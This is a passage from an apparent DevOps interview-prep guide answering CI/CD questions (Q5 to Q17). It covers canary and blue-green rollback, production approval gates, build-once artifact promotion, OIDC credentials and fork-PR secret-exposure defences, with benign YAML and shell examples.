**Rollback mechanics:** because the artifact is immutable and stable never left, rollback is a traffic flip, not a rebuild. **Blue-green** is the even-faster-rollback variant (flip the whole router back instantly) at the cost of double capacity. Layer **feature flags** on top so even a released feature has an instant kill-switch. The complete answer names all three: readiness-gated rollout (no downtime) + metric-based auto-abort (automated rollback) + immutable artifact (fast, clean revert).

### Q6. How would you add a manual approval gate for production only?

Keep dev/staging fully automated (continuous deployment) and put a human gate only in front of prod (continuous *delivery* for that last hop). In GitHub Actions this is a protected **environment** with required reviewers; in GitLab it's a `when: manual` job.

```yaml
# GitHub Actions — 'production' environment requires a reviewer's approval
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging               # auto
    steps: [ { run: ./deploy.sh staging } ]
  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production            # required reviewers set in repo settings → pauses here
    steps: [ { run: ./deploy.sh prod } ]
```

```yaml
# GitLab CI — manual gate for prod only
deploy_prod:
  stage: deploy
  script: ["./deploy.sh prod"]
  environment: production
  when: manual                         # requires a click; can restrict to protected branches
  rules: [{ if: '$CI_COMMIT_BRANCH == "main"' }]
```

Configure the environment with **required reviewers** (and optionally a wait timer / restricted branches). The nuance I'd add: an approval is a *decision* gate, not a *safety* gate — it lets a human accept business risk/timing, but it doesn't make a bad change safe. The actual safety still comes from tests, canary, and rollback. So I use approvals for prod (or for compliance/change-management), not as a substitute for automated verification, and I keep the approval *cheap* to grant so it doesn't become a bottleneck that tanks lead time.

### Q7. A pipeline takes 45 minutes. How do you speed it up?

Measure first — find where the time actually goes — then attack the biggest bars. Usual suspects and fixes:

1. **Cache dependencies and build layers** — restore `node_modules`/`~/.m2`/Docker layer cache instead of reinstalling/rebuilding from scratch. Often the single biggest win.
2. **Parallelize + shard** — run independent jobs concurrently (they already are in GH Actions unless `needs:` chains them); shard the test suite across N runners (Q11 of the verification topic).
3. **Affected-only builds** — especially in a monorepo, only build/test what changed.
4. **Move slow work off the critical path** — run e2e/load post-merge or nightly, not on every PR; gate the PR on the fast layers only.
5. **Fix flaky tests** — retries and re-runs are hidden pipeline time.
6. **Bigger / self-hosted runners** — more CPU or your own hardware for compile-heavy or GPU work; cuts queue time too.
7. **Split the build** — build the artifact once and reuse it across jobs (upload/download or a shared cache) instead of rebuilding per job.

```yaml
# cache deps + shard tests — two highest-leverage changes
- uses: actions/setup-node@v4
  with: { node-version: 20, cache: npm }     # restores ~/.npm across runs
- run: npm ci
- run: npx jest --shard=${{ matrix.shard }}/4
```

The framing: pipeline time is lead-time (a DORA metric) and a tax on every developer, so it's worth real investment. But optimize based on a profile, not a guess — and don't sacrifice the gates that keep main green just to shave minutes.

### Q8. Design deploys for a risk-averse fintech — what changes?

The spine stays; I turn every dial toward safety and auditability, accepting slower lead time as a deliberate trade.

- **Strong verification** — high test coverage, contract tests between services, security scanning (SAST/DAST/dependency), and compliance/policy checks gating the merge. Shift-left hard.
- **Canary + slow bake** — small canary weights with long analysis windows and conservative metric thresholds; automated rollback on any SLO breach. Progressive over big-bang, always.
- **Manual approval for prod** — a **required reviewer** and change-management record for the prod hop (segregation of duties: the deployer isn't the sole approver), satisfying audit/compliance.
- **Immutable, signed, scanned artifacts** — build once, cosign-sign, verify signature at admission; full provenance (SLSA) so you can prove what shipped.
- **Airtight secrets** — OIDC short-lived creds, no long-lived keys, no secrets to fork PRs, least-privilege everywhere.
- **Auditability** — GitOps so every prod change is a reviewed, signed Git commit; deploy markers and immutable logs.
- **Fast, rehearsed rollback + feature flags** — because in fintech a bad deploy is a financial/regulatory event; MTTR must be minimal.

The honest trade-off I'd state: this deliberately lowers deployment frequency/lead time in exchange for a very low change failure rate and airtight audit trail — the correct balance for the risk profile, and defensible precisely because it's a *conscious* DORA trade, not accidental slowness.

### Q9. The pipeline builds the image separately for each environment. What's wrong and how do you fix it?

**Anti-pattern: per-environment rebuilds.** Building a fresh image for dev, staging, and prod means the artifact you tested is *not* the artifact you ship — different base-image updates, dependency resolutions, or build-time state can sneak in between builds. You've broken **reproducibility** and invalidated your own testing: prod runs a binary no environment ever verified.

**Fix: build once, promote the same immutable digest.** Build and tag the image a single time (by git-sha/digest), push to the registry, and *promote that exact digest* through environments — the only thing that changes per environment is configuration (env vars, secrets, config maps), injected at deploy time, never baked into a rebuilt image.

```bash
# build once...
docker build -t ghcr.io/acme/app:${GIT_SHA} .
digest=$(docker push ghcr.io/acme/app:${GIT_SHA} | awk '/digest:/ {print $3}')
# ...promote the SAME digest; config differs per env, artifact does not
kubectl set image deploy/app app=ghcr.io/acme/app@${digest} -n staging
kubectl set image deploy/app app=ghcr.io/acme/app@${digest} -n prod
```

The principle to name explicitly: **the artifact is immutable and environment-agnostic; only config varies per environment.** This is the foundation of a trustworthy deployment pipeline and a precondition for clean rollback (you can only roll back to a specific digest you kept).

### Q10. Deploys take the whole site down for a minute. What's the anti-pattern and the fix?

**Anti-pattern: recreate strategy** — stop all old instances, then start the new ones, leaving a gap with zero healthy capacity. Any deploy = a mini outage.

**Fix: a rolling, blue-green, or canary strategy so old and new overlap and traffic only ever hits healthy instances.**

- **Rolling** (simplest, K8s default) — replace pods incrementally; with **readiness probes** and `maxUnavailable: 0`, new pods must be healthy before old ones drain. Zero downtime, no extra infra.
- **Blue-green** — stand up the full new version, smoke-test it, flip the router; instant rollback by flipping back.
- **Canary** — shift a slice of traffic, watch metrics, ramp.

```yaml
# Kubernetes rolling update that never drops below full capacity
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate: { maxUnavailable: 0, maxSurge: 1 }   # add new before removing old
  template:
    spec:
      containers:
        - name: app
          readinessProbe:                                # no traffic until ready
            httpGet: { path: /healthz, port: 8080 }
```

The root cause is almost always a missing/incorrect **readiness probe** plus a recreate (or `maxUnavailable > 0`) strategy. Fix the probe and the strategy and the outage disappears; pick blue-green/canary if you also want fast rollback and metric-gated safety.

### Q11. Secrets are long-lived AWS access keys stored in repo secrets. Why is that bad and what's the fix?

**Why it's bad:** long-lived static credentials are a top breach vector. They don't rotate, they sit in CI config where any workflow (or a compromised action, or a malicious PR) can read them, they can leak into logs, and if exfiltrated they grant standing access until someone manually revokes them. Storing cloud keys in repo secrets is exactly what attackers look for.

**Fix: OIDC federation — no stored credential at all.** The CI provider issues a short-lived, signed OIDC token per run; the cloud trusts that token via a role trust policy and returns **temporary** credentials scoped to just that job. Nothing long-lived is stored anywhere.

```yaml
# GitHub Actions → AWS via OIDC: no static keys
permissions: { id-token: write, contents: read }   # request the OIDC token
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy   # trusts this repo's OIDC
          aws-region: eu-west-1
      # credentials are now short-lived; expire when the job ends
```

Harden the role's trust policy to your specific repo and even branch/environment (the `sub` claim) so a random fork or another repo can't assume it. The one-line answer: **replace stored long-lived keys with OIDC-issued short-lived credentials, least-privilege, scoped to the exact workflow.**

### Q12. Fork PRs can exfiltrate secrets in your CI. What's the vulnerability and how do you fix it?

**Vulnerability: Poisoned Pipeline Execution (PPE) via `pull_request_target`.** The `pull_request_target` trigger runs the workflow in the **base repo's context — with access to secrets** — but if the workflow then checks out and *executes the PR's code* (build scripts, tests, `npm install` running untrusted lifecycle scripts), a malicious fork can run arbitrary code that reads those secrets and exfiltrates them. The same risk exists any time a privileged job executes untrusted contributor code.

**Fixes:**

- **Don't run untrusted code with secrets.** Use the plain `pull_request` trigger for PR validation — it runs *without* secrets for forks, which is exactly what you want for building/testing untrusted code.
- If you need `pull_request_target` (e.g. to label PRs), **don't check out or execute PR code** in it; operate only on trusted metadata.
- **Require approval to run workflows** on PRs from first-time/outside contributors (the default "require approval for fork PRs" setting).
- **Split trusted/untrusted work**: an unprivileged job builds/tests the fork code with no secrets; a separate privileged job consumes only sanitized artifacts.
- **Least-privilege `GITHUB_TOKEN`** and environment-scoped secrets so even a leak is contained.

```yaml
# SAFE: untrusted fork code is built/tested with NO secrets
on: pull_request            # forks run without repo secrets
jobs:
  test:
    runs-on: ubuntu-latest
    permissions: { contents: read }   # minimal token
    steps:
      - uses: actions/checkout@v4      # PR code, but no secrets in scope
      - run: npm ci && npm test
```

The named principle: **never expose secrets to a job that executes untrusted code.** `pull_request_target` + checkout of PR code is the classic footgun; the fix is trigger choice + separation of trusted and untrusted execution.

### Q13. Main is constantly broken. How do you keep it green?

A perpetually-red main destroys the core CI promise (main is always releasable) and blocks everyone. Fix it with enforcement, not exhortation:

- **Branch protection + required status checks** — you cannot merge to main unless the required checks (lint, unit, build) pass. This alone stops most breakage.
- **Merge queue** — the real fix for "passed on the branch, broke on main" caused by semantic conflicts between concurrently-merged PRs. The queue re-runs required checks against the *actual merged result* and merges serially only if still green, so main can't be broken by two independently-green PRs.
- **Trunk-based development with small, short-lived branches** — smaller changes integrate more often and break less; long-lived branches drift and merge-bomb main.
- **Fast, non-flaky CI** — if checks are slow or flaky, people bypass them; a rising flake rate is itself a main-stability problem (quarantine and fix).
- **Fix-forward or auto-revert policy** — if main does break, reverting the offending commit immediately (some teams automate this) is prioritized over everyone waiting.

```text
# GitHub branch protection (settings) — the enforcement that keeps main green
- Require pull request before merging
- Require status checks to pass: [ci/lint, ci/unit, ci/build]
- Require branches to be up to date  → or better: enable the Merge Queue
- Require linear history
```

The framing: "main keeps breaking" is a *systems* problem solved by required checks + a merge queue + small batches — not a discipline problem solved by asking people to be more careful.

### Q14. Everyone ignores the flaky tests. What's the fix?

A test suite people re-run until green has **zero effective gating value** — real failures hide in the noise, so the flakiness is a security/quality hole, not a mere annoyance. The fix is a deliberate policy, not "try harder":

1. **Detect and measure** — track per-test flake rate; make it a visible metric with a target. What you don't measure, you can't manage.
2. **Quarantine immediately** — pull known-flaky tests out of the *gating* set (tag them, run non-blocking) so they stop failing unrelated PRs and eroding trust *today*. Quarantine preserves the test without letting it block.
3. **Fix at the root, on a clock** — quarantined tests get an owner and a deadline. Root causes are almost always shared mutable state, `sleep`-based timing, real network calls, or nondeterministic ordering (see verification Q7/Q10). Fix the cause.
4. **Delete if unfixable and low-value** — a test that can't be made reliable and doesn't protect much is negative value; remove it honestly rather than leaving it to rot.
5. **Rebuild trust** — once the flake rate is near zero, the gate means something again and re-runs stop being reflexive.

The principle to name: **a gate that's routinely ignored trains people to ignore all gates.** Quarantine to stop the bleeding, then fix the root cause — never normalize "just re-run it."

### Q15. There's no way to roll back a bad deploy. How do you fix that?

No rollback path means every deploy is one-way and every bad deploy is a prolonged incident — a huge MTTR. Three things create a rollback path:

1. **Immutable, versioned artifacts** — you can only roll back to something you kept. Build once, tag by digest/sha, retain previous versions in the registry. If you rebuild per env or overwrite tags, there's nothing clean to return to (ties to Q9).
2. **A deploy strategy with an undo** — blue-green (flip router back), canary (abort to 0%), rolling (`kubectl rollout undo`), or GitOps (`git revert` → reconcile). Pick one and make the undo a single, rehearsed action, ideally automated on failure criteria.
3. **Feature flags** — decouple release from deploy so a bad *feature* is killed with a toggle in seconds, no redeploy at all — the fastest possible "rollback."

```bash
# with immutable artifacts, rollback is re-pointing to the previous digest
kubectl rollout undo deploy/app -n prod            # rolling: back to previous ReplicaSet
# or GitOps:
git revert <bad-sha> && git push                   # ArgoCD reconciles to prev state
```

I'd also make rollback **automated** where possible (metric-based auto-abort) and **rehearsed** (practice it, so it works under incident pressure). And I'd protect it with backward-compatible, forward-only **database migrations** (expand/contract) — an irreversible migration coupled to a deploy is the usual reason "we can't roll back." Named principle: **immutable artifacts + a strategy-specific undo + flags + reversible migrations = a real rollback path.**

### Q16. Deploys are manual click-ops on snowflake servers. What's wrong and how do you modernize it?

Two coupled anti-patterns: **click-ops** (deploys done by hand in a console/SSH, unrepeatable and unaudited) and **snowflake servers** (hosts hand-configured over time, each subtly unique, impossible to reproduce). Together they mean deploys aren't reproducible, drift is invisible, recovery from a lost host is a nightmare, and there's no audit trail of what changed or who did it.

**Fix: pipeline-as-code + infrastructure-as-code + immutable infrastructure.**

- **Pipeline-as-code** — define the deploy in version-controlled workflow files (GitHub Actions/GitLab CI), so every deploy is automated, repeatable, reviewed, and logged. No human running `scp` and `ssh`.
- **Infrastructure-as-code** — Terraform/CloudFormation/Pulumi define servers/clusters declaratively; you rebuild identical infra from code, not memory. This kills snowflakes.
- **Immutable infrastructure** — don't patch running hosts; bake a new image/container and replace them. Servers become disposable and identical, so "reproducible" is automatic.
- **Config in version control** — no more undocumented tweaks; changes go through Git.

The endpoint: a git-triggered pipeline builds an immutable artifact and deploys it to infrastructure defined entirely in code — reproducible, auditable, and recoverable. The one-line diagnosis: **replace manual, unrepeatable actions on unique hosts with automated pipelines deploying immutable artifacts onto IaC-defined, disposable infrastructure.**

### Q17. A bad deploy took two hours to notice. What went wrong and how do you prevent a repeat?

Two hours-to-detect is an MTTR disaster, and it's a *detection* failure, not a deploy failure — the deploy was already bad at minute zero. The gaps and their fixes, layered:

1. **No post-deploy verification** — nothing checked the deployment was healthy after it shipped. Add **smoke tests** immediately post-deploy against critical paths (verification Q4), gating the traffic shift.
2. **No deploy observability / alerting** — no one was watching the golden signals on the new version. Add **SLO burn-rate and error-rate/latency alerting** and **deployment markers** so a regression pages someone in minutes and is instantly correlated to the release.
3. **Big-bang rollout** — 100% of users hit the bad version at once. Use **canary with automated analysis** so a bad deploy is caught at 5% traffic and most users never see it.
4. **No automated rollback** — even once noticed, recovery was slow. Wire **auto-rollback** to the failure criteria so detection triggers recovery without waiting for a human decision.
5. **Synthetic monitoring** — scripted probes exercising key journeys catch "it's technically up but checkout is broken" that infra health checks miss.

```yaml
# the minimum: smoke test the deploy and fail (→ rollback) fast
- name: post-deploy smoke
  run: ./smoke.sh https://app.acme.com || kubectl rollout undo deploy/app -n prod
```

The framing that ties it to DORA: this is an **MTTR** problem, and MTTR = detect + restore. Two hours was almost all *detect*. Fix detection first (smoke tests + observability + alerts), then make restore automatic (canary + auto-rollback). After this, a bad deploy is a two-minute blip at 5% traffic, not a two-hour prod incident.
